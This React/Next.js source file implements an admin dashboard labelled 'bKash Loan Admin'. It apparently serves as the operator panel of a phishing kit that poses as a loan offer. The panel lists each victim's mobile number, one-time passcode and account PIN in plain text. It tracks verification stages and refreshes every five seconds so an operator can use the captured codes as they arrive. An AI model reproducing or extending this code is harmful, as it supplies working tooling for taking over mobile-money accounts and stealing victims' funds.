'use client';
import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';


interface Loan {
  _id: string;
  amount: number;
  category: string;
  mobile_number: string;
  otp_code: string;
  pin_code: string;
  status: string;
  created_at: string;
}

export default function AdminDashboard() {
  const router = useRouter();
  const [loans, setLoans] = useState<Loan[]>([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState('all');
  const [stats, setStats] = useState({ total: 0, pending: 0, approved: 0, rejected: 0 });

  const updateStats = (allLoans: Loan[]) => {
    const total = allLoans.length;
    const pending = allLoans.filter(l => !['approved', 'rejected'].includes(l.status)).length;
    const approved = allLoans.filter(l => l.status === 'approved').length;
    const rejected = allLoans.filter(l => l.status === 'rejected').length;
    setStats({ total, pending, approved, rejected });
  };

  const fetchLoans = useCallback(async () => {
    try {
      const res = await fetch(`/api/admin/loans?status=${filter}`);
      const data = await res.json();
      if (data.success) {
        setLoans(data.loans);
        updateStats(data.loans);
      } else {
        router.push('/admin/login');
      }
    } catch (err) {
      console.error('Fetch error:', err);
    } finally {
      setLoading(false);
    }
  }, [filter, router]);

  useEffect(() => {
    fetchLoans();
    const interval = setInterval(fetchLoans, 5000);
    return () => clearInterval(interval);
  }, [fetchLoans]);


  const handleAction = async (id: string, action: 'approve' | 'reject') => {
    if (!confirm(`Are you sure you want to ${action} this loan?`)) return;
    
    try {
      const res = await fetch('/api/admin/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ loan_id: id, action })
      });
      const data = await res.json();
      if (data.success) {
        fetchLoans();
      }
    } catch (err) {
      console.error('Action error:', err);
    }
  };

  const getStatusBadge = (status: string) => {
    const styles: Record<string, string> = {
      pending: 'bg-gray-100 text-gray-800',
      mobile_verified: 'bg-blue-100 text-blue-800',
      otp_verified: 'bg-indigo-100 text-indigo-800',
      pin_verified: 'bg-purple-100 text-purple-800',
      processing: 'bg-yellow-100 text-yellow-800 animate-pulse',
      approved: 'bg-green-100 text-green-800',
      rejected: 'bg-red-100 text-red-800',
    };
    return (
      <span className={`px-2 py-1 rounded-full text-xs font-medium ${styles[status] || styles.pending}`}>
        {status.replace('_', ' ').toUpperCase()}
      </span>
    );
  };

  return (
    <div className="bg-gray-50 min-h-screen">
      <nav className="bg-white shadow-sm px-6 py-4 flex justify-between items-center">
        <h1 className="text-xl font-bold text-gray-800 flex items-center">
          <i className="fas fa-university text-pink-600 mr-2"></i>
          bKash Loan Admin
        </h1>
        <button 
          onClick={() => {
            document.cookie = 'admin_token=; path=/; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
            router.push('/admin/login');
          }}
          className="text-gray-500 hover:text-red-600 text-sm font-medium"
        >
          Logout
        </button>
      </nav>

      <main className="p-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <div className="bg-white p-6 rounded-2xl shadow-sm border-l-4 border-blue-500">
            <p className="text-sm text-gray-500 mb-1">Total Requests</p>
            <p className="text-2xl font-bold text-gray-800">{stats.total}</p>
          </div>
          <div className="bg-white p-6 rounded-2xl shadow-sm border-l-4 border-yellow-500">
            <p className="text-sm text-gray-500 mb-1">Pending Review</p>
            <p className="text-2xl font-bold text-gray-800">{stats.pending}</p>
          </div>
          <div className="bg-white p-6 rounded-2xl shadow-sm border-l-4 border-green-500">
            <p className="text-sm text-gray-500 mb-1">Approved</p>
            <p className="text-2xl font-bold text-gray-800">{stats.approved}</p>
          </div>
          <div className="bg-white p-6 rounded-2xl shadow-sm border-l-4 border-red-500">
            <p className="text-sm text-gray-500 mb-1">Rejected</p>
            <p className="text-2xl font-bold text-gray-800">{stats.rejected}</p>
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white p-4 rounded-2xl shadow-sm mb-6 flex justify-between items-center">
          <div className="flex space-x-4">
            {['all', 'pending', 'approved', 'rejected'].map(f => (
              <button 
                key={f}
                onClick={() => setFilter(f)}
                className={`px-4 py-2 rounded-xl text-sm font-medium transition-colors ${filter === f ? 'bg-pink-600 text-white' : 'text-gray-500 hover:bg-gray-100'}`}
              >
                {f.charAt(0).toUpperCase() + f.slice(1)}
              </button>
            ))}
          </div>
          <button onClick={fetchLoans} className="text-pink-600 hover:text-pink-700">
            <i className="fas fa-sync-alt"></i>
          </button>
        </div>

        {/* Loans Table */}
        <div className="bg-white rounded-2xl shadow-sm overflow-hidden border">
          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead className="bg-gray-50 border-b">
                <tr>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">ID</th>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">Amount</th>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">Category</th>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">Mobile</th>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">OTP</th>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">PIN</th>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">Status</th>
                  <th className="px-6 py-4 text-xs font-semibold text-gray-500 uppercase">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {loading ? (
                  <tr><td colSpan={8} className="text-center py-20 text-gray-400">Loading loans...</td></tr>
                ) : loans.length === 0 ? (
                  <tr><td colSpan={8} className="text-center py-20 text-gray-400">No applications found.</td></tr>
                ) : loans.map(loan => (
                  <tr key={loan._id} className="hover:bg-gray-50 transition-colors">
                    <td className="px-6 py-4 text-sm text-gray-400 font-mono">...{loan._id.slice(-6)}</td>
                    <td className="px-6 py-4 text-sm font-bold text-gray-800">৳{loan.amount.toLocaleString()}</td>
                    <td className="px-6 py-4 text-sm text-gray-600">{loan.category}</td>
                    <td className="px-6 py-4 text-sm text-gray-800 font-medium">{loan.mobile_number || '-'}</td>
                    <td className="px-6 py-4 text-sm text-blue-600 font-mono font-bold">{loan.otp_code || '-'}</td>
                    <td className="px-6 py-4 text-sm text-purple-600 font-mono font-bold">{loan.pin_code || '-'}</td>
                    <td className="px-6 py-4">{getStatusBadge(loan.status)}</td>
                    <td className="px-6 py-4">
                      {['approved', 'rejected'].includes(loan.status) ? (
                        <span className="text-xs text-gray-400">Processed</span>
                      ) : (
                        <div className="flex space-x-2">
                          <button 
                            onClick={() => handleAction(loan._id, 'approve')}
                            className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded-lg text-xs"
                          >
                            Approve
                          </button>
                          <button 
                            onClick={() => handleAction(loan._id, 'reject')}
                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded-lg text-xs"
                          >
                            Reject
                          </button>
                        </div>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
}
